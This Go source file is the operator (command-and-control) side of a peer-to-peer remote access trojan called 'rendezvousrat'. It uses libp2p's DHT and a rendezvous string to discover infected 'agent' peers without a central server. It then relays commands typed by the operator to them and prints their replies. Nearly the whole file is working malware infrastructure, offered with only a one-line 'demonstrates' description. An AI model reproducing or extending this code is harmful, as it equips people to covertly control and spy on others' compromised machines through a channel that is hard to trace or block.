package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"os"
	"strings"
	"sync"

	"github.com/CrowdSurge/banner"
	"github.com/libp2p/go-libp2p"
	"github.com/libp2p/go-libp2p-core/network"
	"github.com/libp2p/go-libp2p-core/peer"
	"github.com/libp2p/go-libp2p-core/protocol"
	discovery "github.com/libp2p/go-libp2p-discovery"

	dht "github.com/libp2p/go-libp2p-kad-dht"
	multiaddr "github.com/multiformats/go-multiaddr"
)

func handleStream(stream network.Stream) {
	fmt.Println("Got a new stream!")

	// Create a buffer stream for non blocking read and write.
	rw := bufio.NewReadWriter(bufio.NewReader(stream), bufio.NewWriter(stream))

	go readData(rw)
	go writeData(rw)

}

func readData(rw *bufio.ReadWriter) {

	for {
		str, err := rw.ReadString('\n')
		if err != nil {
			continue
		} else if strings.HasPrefix(str, "+") {
			var id = strings.Split(str, "+")
			fmt.Printf("%s Connected!\n", id[1])
		} else if str != "\n" {
			fmt.Printf("%s", str)
		}

	}
}

func writeData(rw *bufio.ReadWriter) {
	stdReader := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("rendezvousrat> ")
		sendData, err := stdReader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading from stdin")
			//panic(err)
			continue
		}

		_, err = rw.WriteString(fmt.Sprintf("%s\n", sendData))
		if err != nil {
			fmt.Println("Error writing to buffer")
			//panic(err)
			continue
		}
		err = rw.Flush()
		if err != nil {
			fmt.Println("Error flushing buffer")
			//panic(err)
			continue
		}
	}
}

func main() {

	help := flag.Bool("h", false, "Display Help")
	config, err := ParseFlags()
	if err != nil {
		panic(err)
	}

	if *help {
		fmt.Println("This program demonstrates a simple p2p RAT using libp2p and rendezvous")
		fmt.Println()
		fmt.Println("Usage: Run './server -rendezvous meetmehere")
		flag.PrintDefaults()
		return
	}
	banner.Print("rendezvousrat")
	fmt.Println("")
	ctx := context.Background()

	// libp2p.New constructs a new libp2p Host. Other options can be added
	// here.
	host, err := libp2p.New(ctx,
		libp2p.ListenAddrs([]multiaddr.Multiaddr(config.ListenAddresses)...),
	)
	if err != nil {
		//panic(err)
	}
	fmt.Println("Host created. We are:", host.ID())

	// Set a function as stream handler. This function is called when a peer
	// initiates a connection and starts a stream with this peer.
	host.SetStreamHandler(protocol.ID(config.ProtocolID), handleStream)

	// Start a DHT, for use in peer discovery. We can't just make a new DHT
	// client because we want each peer to maintain its own local copy of the
	// DHT, so that the bootstrapping node of the DHT can go down without
	// inhibiting future peer discovery.
	kademliaDHT, err := dht.New(ctx, host)
	if err != nil {
		//panic(err)
	}

	// Bootstrap the DHT. In the default configuration, this spawns a Background
	// thread that will refresh the peer table every five minutes.

	if err = kademliaDHT.Bootstrap(ctx); err != nil {
		//panic(err)
	}

	// Let's connect to the bootstrap nodes first. They will tell us about the
	// other nodes in the network.
	var wg sync.WaitGroup
	for _, peerAddr := range config.BootstrapPeers {
		peerinfo, _ := peer.AddrInfoFromP2pAddr(peerAddr)
		wg.Add(1)
		go func() {
			defer wg.Done()
			if err := host.Connect(ctx, *peerinfo); err != nil {

			} else {

			}
		}()
	}
	wg.Wait()

	// We use a rendezvous point "meet me here" to announce our location.
	// This is like telling your friends to meet you at the Eiffel Tower.
	fmt.Println("Announcing ourselves...")
	routingDiscovery := discovery.NewRoutingDiscovery(kademliaDHT)
	discovery.Advertise(ctx, routingDiscovery, config.RendezvousString)
	fmt.Println("Successfully announced!")
	fmt.Println("Waiting for agent...")
	// Now, look for others who have announced
	// This is like your friend telling you the location to meet you.

	peerChan, err := routingDiscovery.FindPeers(ctx, config.RendezvousString)
	if err != nil {
		//panic(err)
	}

	for peer := range peerChan {
		if peer.ID == host.ID() {
			continue
		}

		stream, err := host.NewStream(ctx, peer.ID, protocol.ID(config.ProtocolID))

		if err != nil {

		} else {

			rw := bufio.NewReadWriter(bufio.NewReader(stream), bufio.NewWriter(stream))

			go writeData(rw)
			go readData(rw)
		}

	}

	select {}
}
